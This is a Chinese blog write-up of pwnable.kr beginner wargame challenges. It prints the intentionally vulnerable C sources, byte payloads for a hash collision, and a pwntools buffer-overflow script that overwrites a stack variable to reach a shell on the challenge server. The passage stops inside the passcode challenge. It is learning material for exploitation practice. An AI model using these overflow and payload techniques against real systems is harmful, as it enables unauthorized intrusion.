<!DOCTYPE html>
<html lang="zh-CN">
    <!-- title -->




<!-- keywords -->




<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
    <meta name="author" content="Sariel.D">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="Sariel.D">
    
    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
    
    <meta name="description" content="">
    <meta name="description" content="好久没更新，菜鸡学 pwn">
<meta property="og:type" content="article">
<meta property="og:title" content="Pwnable.kr 之 Toddler&#39;s Bottle">
<meta property="og:url" content="https://blog.sari3l.com/posts/d4fb29f2/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="好久没更新，菜鸡学 pwn">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
<meta property="article:published_time" content="2020-06-14T14:54:02.000Z">
<meta property="article:modified_time" content="2020-07-06T09:45:14.050Z">
<meta property="article:author" content="Sariel.D">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    
    <link rel="alternate" href="/atom.xml" title="Learning Man&#39;s Blog" type="application/atom+xml">
    
    <title>Pwnable.kr 之 Toddler&#39;s Bottle · Learning Man</title>
    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }

</style>

    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
    
    <link rel="preload" href="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io@latest/css/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
    
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
(function( w ){
	"use strict";
	// rel=preload support test
	if( !w.loadCSS ){
		w.loadCSS = function(){};
	}
	// define on the loadCSS obj
	var rp = loadCSS.relpreload = {};
	// rel=preload feature support test
	// runs once and returns a function for compat purposes
	rp.support = (function(){
		var ret;
		try {
			ret = w.document.createElement( "link" ).relList.supports( "preload" );
		} catch (e) {
			ret = false;
		}
		return function(){
			return ret;
		};
	})();

	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
	// then change that media back to its intended value on load
	rp.bindMediaToggle = function( link ){
		// remember existing media attr for ultimate state, or default to 'all'
		var finalMedia = link.media || "all";

		function enableStylesheet(){
			link.media = finalMedia;
		}

		// bind load handlers to enable media
		if( link.addEventListener ){
			link.addEventListener( "load", enableStylesheet );
		} else if( link.attachEvent ){
			link.attachEvent( "onload", enableStylesheet );
		}

		// Set rel and non-applicable media type to start an async request
		// note: timeout allows this to happen async to let rendering continue in IE
		setTimeout(function(){
			link.rel = "stylesheet";
			link.media = "only x";
		});
		// also enable media after 3 seconds,
		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
		setTimeout( enableStylesheet, 3000 );
	};

	// loop through link elements in DOM
	rp.poly = function(){
		// double check this to prevent external calls from running
		if( rp.support() ){
			return;
		}
		var links = w.document.getElementsByTagName( "link" );
		for( var i = 0; i < links.length; i++ ){
			var link = links[ i ];
			// qualify links to those with rel=preload and as=style attrs
			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
				// prevent rerunning on link
				link.setAttribute( "data-loadcss", true );
				// bind listeners to toggle media back
				rp.bindMediaToggle( link );
			}
		}
	};

	// if unsupported, run the polyfill
	if( !rp.support() ){
		// run once at least
		rp.poly();

		// rerun poly on an interval until onload
		var run = w.setInterval( rp.poly, 500 );
		if( w.addEventListener ){
			w.addEventListener( "load", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		} else if( w.attachEvent ){
			w.attachEvent( "onload", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		}
	}


	// commonjs
	if( typeof exports !== "undefined" ){
		exports.loadCSS = loadCSS;
	}
	else {
		w.loadCSS = loadCSS;
	}
}( typeof global !== "undefined" ? global : this ) );
</script>

    <link rel="icon" href= "/assets/favicon.ico" />
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
    <link rel="preload" href="/scripts/main.js" as="script" />
    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
    
    <!-- fancybox -->
    <script src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io@latest/scripts/jquery.fancybox.min.js" defer></script>
    <!-- 百度统计  -->
    
    <!-- 谷歌统计  -->
    
    <script>
        (function (i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
        (i[r].q = i[r].q || []).push(arguments)
        }, i[r].l = 1 * new Date(); a = s.createElement(o),
        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
        ga('create', 'UA-129685149-2', 'auto');
        ga('send', 'pageview');
    </script>
    
<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-funky.css" type="text/css"></head>

    
        <body class="post-body">
    
    
<header class="header">

    <div class="read-progress"></div>
    <div class="header-sidebar-menu">&#xe775;</div>
    <!-- post页的toggle banner  -->
    
    <div class="banner">
            <div class="blog-title">
                <a href="/" >Learning Man&#39;s Blog</a>
            </div>
            <div class="post-title">
                <a href="#" class="post-name">Pwnable.kr 之 Toddler's Bottle</a>
            </div>
    </div>
    
    <a class="home-link" href=/>Learning Man's Blog</a>
</header>
    <div class="wrapper">
        <div class="site-intro" style="







height:50vh;
">
    
    <!-- 主页  -->
    
    
    <!-- 404页  -->
            
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/intro/post-bg.jpg)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
            Pwnable.kr 之 Toddler's Bottle
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
            
            <!-- 404 -->
            
        </p>
        <!-- 文章页meta -->
        
            <div class="post-intros">
                <!-- 文章页标签  -->
                
                    <div class= post-intro-tags >
    
        <a class="post-tag" href="javascript:void(0);" data-tags = "pwn">pwn</a>
    
</div>
                
                
                    <div class="post-intro-read">
                        <span>字数统计: <span class="post-count word-count">11.3k</span>阅读时长: <span class="post-count reading-time">63 min</span></span>
                    </div>
                
                <div class="post-intro-meta">
                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
                    <span class="post-intro-time">2020/06/14</span>
                    
                    <span class="shareWrapper">
                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
                        <span class="shareText">Share</span>
                        <ul class="shareList">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>
        <script>
 
  // get user agent
  var browser = {
    versions: function () {
      var u = window.navigator.userAgent;
      return {
        userAgent: u,
        trident: u.indexOf('Trident') > -1, //IE内核
        presto: u.indexOf('Presto') > -1, //opera内核
        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
        iPad: u.indexOf('iPad') > -1, //是否为iPad
        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
      };
    }()
  }
  console.log("userAgent:" + browser.versions.userAgent);

  // callback
  function fontLoaded() {
    console.log('font loaded');
    if (document.getElementsByClassName('site-intro-meta')) {
      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in');
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb(){
    if (browser.versions.uc) {
      console.log("UCBrowser");
      fontLoaded();
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular']
        },
        loading: function () {  //所有字体开始加载
          // console.log('loading');
        },
        active: function () {  //所有字体已渲染
          fontLoaded();
        },
        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout');
          fontLoaded();
        },
        timeout: 5000 // Set the timeout to two seconds
      });
    }
  }

  function asyncErr(){
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }

  var asyncLoadWithFallBack = function(arr, success, reject) {
      var currReject = function(){
        reject()
        arr.shift()
        if(arr.length)
          async(arr[0], success, currReject)
        }

      async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack([
    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
    "/lib/webfontloader.min.js"
  ], asyncCb, asyncErr)
</script>        
        <!--<img class="loading" src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/images/loading.gif" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
        -->
        <img class="loading" src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
        <div class="container container-unloaded">
            <main class="main post-page">
    <article class="article-entry">
        <h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ol>
<li><p>关于反汇编时函数显示 plt </p>
<ul>
<li>原因：<a href="https://www.binss.me/blog/plt-and-got/" target="_blank" rel="noopener">PLT与GOT</a></li>
<li>解决方案：<a href="https://reverseengineering.stackexchange.com/questions/19895/radares-aaaa-and-aa-what-does-it-do-exactly" target="_blank" rel="noopener">Radare’s <code>aaaa</code> and -AA what does it do, exactly?</a></li>
</ul>
</li>
<li><p>注意 pwndbg 对 heap 命令进行过一次大改，最后一次还易使用 commit 为 fbd2bb3abfc2500aae76d159e23015008e879b8d<br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15915160149123.jpg" alt="-w878"></p>
</li>
</ol>
<h2 id="1-fd"><a href="#1-fd" class="headerlink" title="1. [fd]"></a>1. [fd]</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c">fd@pwnable<span class="token punctuation">:</span><span class="token operator">~</span>$ cat fd<span class="token punctuation">.</span>c
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pass argv[1] a number\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1234</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    len <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"LETMEWIN\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"good job :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"learn about Linux file IO\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span></code></pre>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>我们首先注意到 read 函数语法，暂时没找到</p>
<p>由于 fd 为传入可控，当我们将 fd=0x0时，即 fd=stdin 时，我们就可以控制 buf 内的内容，从而通过判断获取 flag</p>
<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">fd@pwnable:~$ ./fd 4660
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!</code></pre>
<h2 id="2-collision"><a href="#2-collision" class="headerlink" title="2. collision"></a>2. collision</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> hashcode <span class="token operator">=</span> <span class="token number">0x21DD09EC</span><span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token function">check_password</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span><span class="token operator">*</span> ip <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">;</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        res <span class="token operator">+</span><span class="token operator">=</span> ip<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"usage : %s [passcode]\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"passcode length should be 20 bytes\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>hashcode <span class="token operator">==</span> <span class="token function">check_password</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wrong passcode.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><ol>
<li>限制传入值为 20 字节</li>
<li>将传入的内容分为 5 个 int 值</li>
<li>sum 之和需为 hashcode</li>
</ol>
<p>0x21DD09EC == 568134124 == 113626824*4 + 113626828</p>
<h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">col@pwnable:~$ ./col `echo -e "\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06"`
daddy! I just managed to create a hash collision :)</code></pre>
<p>或者</p>
<pre class=" language-shell"><code class="language-shell">col@pwnable:~$ ./col `printf "\xc8\xce\xc5\x06%0.s" {1..4} && printf "\xcc\xce\xc5\x06"`
daddy! I just managed to create a hash collision :)</code></pre>
<p><a href="https://qastack.cn/superuser/86340/linux-command-to-repeat-a-string-n-times" target="_blank" rel="noopener">https://qastack.cn/superuser/86340/linux-command-to-repeat-a-string-n-times</a></p>
<h2 id="3-bof"><a href="#3-bof" class="headerlink" title="3. bof"></a>3. bof</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">int</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">char</span> overflowme<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"overflow me : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">gets</span><span class="token punctuation">(</span>overflowme<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// smash me!</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>key <span class="token operator">==</span> <span class="token number">0xcafebabe</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Nah..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">func</span><span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>在 Ninja 中，可以方便看到逻辑判断</p>
<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15907181567512.jpg" alt="-w815"></p>
<p>我们来看下C语言函数调用栈的典型内存布局</p>
<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15907189598255.jpg" alt></p>
<p>因为存储变量时是从低地址开始覆盖的，所以从 ebp-0x2c 到 ebp+0x8，我们需要覆盖长度 0x34 的数据，然后覆盖变量值为0xcafebabe</p>
<h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

conn <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> <span class="token number">9000</span><span class="token punctuation">)</span>
conn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b<span class="token string">"A"</span><span class="token operator">*</span><span class="token number">52</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xcafebabe</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
conn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h2 id="4-flag"><a href="#4-flag" class="headerlink" title="4. flag"></a>4. flag</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><pre class=" language-plain"><code class="language-plain">Papa brought me a packed present! let's open it.

Download : http://pwnable.kr/bin/flag

This is reversing task. all you need is binary</code></pre>
<h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>首先拿到题目，直接拖进 Ninja 可以发觉是加了壳的，简单识别下可以看到是 upx 壳</p>
<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15907233766982.jpg" alt="-w411"></p>
<p>利用<code>upx -d</code>脱壳</p>
<pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/桌面$ '/home/pwn/tools/upx-3.96-amd64_linux/upx' -d flag 
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    883745 <-    335288   37.94%   linux/amd64   flag

Unpacked 1 file.</code></pre>
<p>查看下 main 函数，注意到字符串存储的位置</p>
<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15907236039631.jpg" alt="-w452"></p>
<p>点进去看下，可以看到上面的那串应该就是 flag 了</p>
<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15907235836712.jpg" alt="-w994"></p>
<h3 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/桌面$ strings flag | grep ':)'
UPX...? sounds like a delivery service :)</code></pre>
<h2 id="5-passcode"><a href="#5-passcode" class="headerlink" title="5. passcode"></a>5. passcode</h2><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">void</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> passcode1<span class="token punctuation">;</span>
    <span class="token keyword">int</span> passcode2<span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"enter passcode1 : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> passcode1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span>
